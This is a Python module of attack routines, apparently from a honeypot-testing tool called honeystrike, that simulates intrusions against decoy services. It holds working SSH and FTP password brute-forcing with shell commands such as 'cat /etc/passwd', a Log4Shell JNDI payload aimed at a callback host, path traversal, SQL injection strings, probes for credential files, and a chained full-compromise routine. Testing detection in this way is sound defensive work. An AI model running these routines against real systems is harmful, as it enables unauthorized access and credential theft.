"""Pure-async attack engines. One function per scenario.

Designed so:
  - `scenarios.py` calls them via `run_async(...)` for typer commands;
  - `campaigns.py` chains them via direct `await`;
  - tests can monkey-patch any I/O or call the runner directly with a fake socket.

Every runner returns a small dict of run metadata; nothing throws on
expected protocol-level failures (auth rejects, RST after JA3 capture, etc.).
"""

from __future__ import annotations

import asyncio
import contextlib
import socket
import ssl
import struct
from pathlib import Path
from typing import Any

import httpx


# Default Hydra "fast creds" — same set the platform's signature library uses.
_HYDRA_FAST_CREDS = [
    "root", "toor", "123456", "password", "letmein", "qwerty",
    "admin", "hunter2", "oracle", "test",
]

_INTENSITY_DELAY = {"slow": 1.0, "medium": 0.1, "burst": 0.0}


def _parse_target(target: str, default_port: int) -> tuple[str, int]:
    if ":" in target:
        host, port_s = target.rsplit(":", 1)
        return host, int(port_s)
    return target, default_port


def _sleep(intensity: str) -> float:
    return _INTENSITY_DELAY.get(intensity, 0.1)


# ---------------------------------------------------------------------------
# SSH
# ---------------------------------------------------------------------------

async def ssh_hydra(
    *,
    target: str,
    username: str = "root",
    password_list_path: str | None = None,
    count: int | None = None,
    intensity: str = "medium",
    keep_shell: bool = False,
) -> dict[str, Any]:
    import paramiko        # local import — paramiko is heavy

    host, port = _parse_target(target, 22)
    if password_list_path:
        passwords = [
            line.strip() for line in Path(password_list_path).read_text().splitlines()
            if line.strip()
        ]
    else:
        passwords = list(_HYDRA_FAST_CREDS)
    if count is not None:
        passwords = passwords[:count]

    def _run() -> dict[str, Any]:
        attempts = 0
        granted = None
        delay = _sleep(intensity)
        try:
            sock = socket.create_connection((host, port), timeout=10)
            t = paramiko.Transport(sock)
            t.start_client(timeout=10)
            for pw in passwords:
                attempts += 1
                try:
                    t.auth_password(username, pw)
                    granted = pw
                    break
                except paramiko.AuthenticationException:
                    pass
                except paramiko.SSHException:
                    break
                if delay:
                    import time
                    time.sleep(delay)
            if granted and keep_shell:
                with contextlib.suppress(Exception):
                    chan = t.open_session()
                    chan.get_pty()
                    chan.invoke_shell()
                    chan.settimeout(2)
                    chan.send(b"whoami\n")
                    with contextlib.suppress(socket.timeout):
                        chan.recv(4096)
                    chan.send(b"cat /etc/passwd\n")
                    with contextlib.suppress(socket.timeout):
                        chan.recv(4096)
                    chan.send(b"exit\n")
            t.close()
        except OSError as exc:
            return {"attempts": attempts, "granted": None, "error": str(exc)}
        return {"attempts": attempts, "granted": granted}

    return await asyncio.to_thread(_run)


# ---------------------------------------------------------------------------
# HTTP
# ---------------------------------------------------------------------------

async def _http_request(
    *, target: str, method: str, path: str, headers: dict[str, str] | None = None,
    body: str | None = None, content_type: str | None = None,
) -> int:
    host, port = _parse_target(target, 80)
    url = f"http://{host}:{port}{path}"
    h = dict(headers or {})
    if content_type:
        h["Content-Type"] = content_type
    async with httpx.AsyncClient(timeout=10) as client:
        try:
            r = await client.request(method, url, headers=h, content=body)
            return r.status_code
        except httpx.HTTPError:
            return -1


async def http_sqlmap(
    *, target: str, path: str, user_agent: str, count: int, intensity: str,
) -> dict[str, Any]:
    delay = _sleep(intensity)
    statuses: list[int] = []
    for _ in range(count):
        s = await _http_request(
            target=target, method="GET", path=path,
            headers={"User-Agent": user_agent},
        )
        statuses.append(s)
        if delay:
            await asyncio.sleep(delay)
    return {"requests": len(statuses), "statuses": statuses}


async def http_log4shell(
    *, target: str, path: str, callback: str, count: int,
) -> dict[str, Any]:
    body = "${" + f"jndi:{callback}" + "}"
    statuses: list[int] = []
    for _ in range(count):
        s = await _http_request(
            target=target, method="POST", path=path,
            headers={"User-Agent": "log4shell-poc/1.0"},
            body=body, content_type="text/plain",
        )
        statuses.append(s)
    return {"requests": len(statuses), "statuses": statuses}


async def http_traversal(
    *, target: str, depth: int, encoding: str,
) -> dict[str, Any]:
    seg = "../"
    if encoding == "url":
        seg = "..%2f"
    elif encoding == "double-url":
        seg = "..%252f"
    path = "/files?path=" + (seg * depth) + "etc/passwd"
    s = await _http_request(target=target, method="GET", path=path)
    return {"requests": 1, "statuses": [s]}


async def http_recon(
    *, target: str, paths: list[str] | None, user_agent: str,
) -> dict[str, Any]:
    from honeystrike.cli.attack import canaries as canary_module

    if paths is None:
        paths = [
            "/.env", "/.git/HEAD", "/wp-login.php", "/wp-admin/index.php",
            "/phpmyadmin/", "/server-status", "/server-info",
            "/admin", "/api/v1/health", "/api/v1/users", "/console",
            "/.aws/credentials",
        ]
    statuses: list[int] = []
    canaries_seen = 0
    host, port = _parse_target(target, 80)
    async with httpx.AsyncClient(
        base_url=f"http://{host}:{port}", timeout=10,
        headers={"User-Agent": user_agent},
    ) as client:
        for p in paths:
            try:
                r = await client.get(p)
                statuses.append(r.status_code)
                if canary_module.contains_canary(r.text):
                    canaries_seen += 1
            except httpx.HTTPError:
                statuses.append(-1)
    return {"requests": len(statuses), "statuses": statuses, "canaries_seen": canaries_seen}


# ---------------------------------------------------------------------------
# FTP
# ---------------------------------------------------------------------------

async def ftp_hydra(
    *, target: str, credentials: str, intensity: str,
) -> dict[str, Any]:
    import ftplib

    host, port = _parse_target(target, 21)
    pairs = [tuple(p.split(":", 1)) for p in credentials.split(",") if ":" in p]

    def _run() -> dict[str, Any]:
        attempts = 0
        sessions = 0
        delay = _INTENSITY_DELAY.get(intensity, 0.1)
        for u, p in pairs:
            attempts += 1
            try:
                f = ftplib.FTP()
                f.connect(host, port, timeout=10)
                sessions += 1
                with contextlib.suppress(ftplib.error_perm):
                    f.login(u, p)
                with contextlib.suppress(Exception):
                    f.quit()
            except OSError:
                pass
            if delay:
                import time
                time.sleep(delay)
        return {"attempts": attempts, "sessions": sessions}

    return await asyncio.to_thread(_run)


# ---------------------------------------------------------------------------
# RDP
# ---------------------------------------------------------------------------

async def rdp_scan(
    *, target: str, cookie: str, protocols: int,
) -> dict[str, Any]:
    host, port = _parse_target(target, 3389)

    def _run() -> dict[str, Any]:
        try:
            s = socket.create_connection((host, port), timeout=5)
            payload = f"Cookie: {cookie}\r\n".encode("ascii")
            neg = struct.pack("<BBHI", 0x01, 0x00, 8, protocols)
            data = payload + neg
            x224 = bytes([6 + len(data), 0xE0, 0, 0, 0, 0, 0]) + data
            tpkt = bytes([0x03, 0x00]) + struct.pack(">H", 4 + len(x224)) + x224
            s.sendall(tpkt)
            with contextlib.suppress(socket.timeout):
                resp = s.recv(4096)
                s.close()
                return {"bytes_received": len(resp)}
            s.close()
            return {"bytes_received": 0}
        except OSError as exc:
            return {"bytes_received": 0, "error": str(exc)}

    return await asyncio.to_thread(_run)


# ---------------------------------------------------------------------------
# TLS
# ---------------------------------------------------------------------------

async def tls_fingerprint(
    *, target: str, sni: str, cipher_mode: str,
) -> dict[str, Any]:
    host, port = _parse_target(target, 443)

    def _run() -> dict[str, Any]:
        ctx = ssl.create_default_context()
        if cipher_mode == "modern":
            ctx.set_ciphers("ECDHE+AESGCM:ECDHE+CHACHA20")
        elif cipher_mode == "legacy":
            with contextlib.suppress(ssl.SSLError):
                ctx.set_ciphers("DEFAULT:@SECLEVEL=0")
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        try:
            s = socket.create_connection((host, port), timeout=5)
            try:
                ws = ctx.wrap_socket(s, server_hostname=sni)
                ws.close()
            except (ssl.SSLError, OSError):
                pass
            finally:
                with contextlib.suppress(OSError):
                    s.close()
            return {"ok": True}
        except OSError as exc:
            return {"ok": False, "error": str(exc)}

    return await asyncio.to_thread(_run)


# ---------------------------------------------------------------------------
# Multi-service
# ---------------------------------------------------------------------------

_DEFAULT_PORTS = {"ssh": 2222, "http": 18080, "ftp": 2221, "rdp": 33389, "tls": 8443}


async def multi_service(
    *, target_host: str, services: list[str], intensity: str,
) -> dict[str, Any]:
    delay = _sleep(intensity)
    services_hit: list[str] = []
    for svc in services:
        port = _DEFAULT_PORTS.get(svc)
        if port is None:
            continue
        target = f"{target_host}:{port}"
        if svc == "ssh":
            await ssh_hydra(target=target, count=1, intensity="burst")
        elif svc == "http":
            await http_sqlmap(target=target, path="/wp-login.php",
                              user_agent="sqlmap/1.7.8#stable",
                              count=1, intensity="burst")
        elif svc == "ftp":
            await ftp_hydra(target=target, credentials="root:toor", intensity="burst")
        elif svc == "rdp":
            await rdp_scan(target=target, cookie="mstshash=multi", protocols=1)
        elif svc == "tls":
            await tls_fingerprint(target=target, sni="example.com", cipher_mode="default")
        services_hit.append(svc)
        if delay:
            await asyncio.sleep(delay)
    return {"services_hit": len(services_hit), "services": services_hit}


# ---------------------------------------------------------------------------
# Full compromise — recon → exploit → access → discovery → exfil
# ---------------------------------------------------------------------------

async def full_compromise(
    *, target_host: str, dwell_seconds: float, with_report: bool,
) -> dict[str, Any]:
    phases: list[str] = []
    # 1. HTTP recon (canary capture)
    await http_recon(
        target=f"{target_host}:{_DEFAULT_PORTS['http']}",
        paths=None, user_agent="Nikto/2.5.0",
    )
    phases.append("http-recon")
    await asyncio.sleep(dwell_seconds)

    # 2. HTTP sqlmap
    await http_sqlmap(
        target=f"{target_host}:{_DEFAULT_PORTS['http']}",
        path="/wp-admin/index.php?id=1+UNION+SELECT+password+FROM+users",
        user_agent="sqlmap/1.7.8#stable", count=1, intensity="burst",
    )
    phases.append("http-sqlmap")
    await asyncio.sleep(dwell_seconds)

    # 3. SSH brute + shell
    await ssh_hydra(
        target=f"{target_host}:{_DEFAULT_PORTS['ssh']}",
        keep_shell=True, intensity="burst",
    )
    phases.append("ssh-hydra-shell")
    await asyncio.sleep(dwell_seconds)

    # 4. FTP login
    await ftp_hydra(
        target=f"{target_host}:{_DEFAULT_PORTS['ftp']}",
        credentials="root:toor,admin:admin", intensity="burst",
    )
    phases.append("ftp-hydra")

    # 5. TLS fingerprint
    await tls_fingerprint(
        target=f"{target_host}:{_DEFAULT_PORTS['tls']}",
        sni="example.com", cipher_mode="default",
    )
    phases.append("tls-fingerprint")
    return {"phases": len(phases), "phases_list": phases}
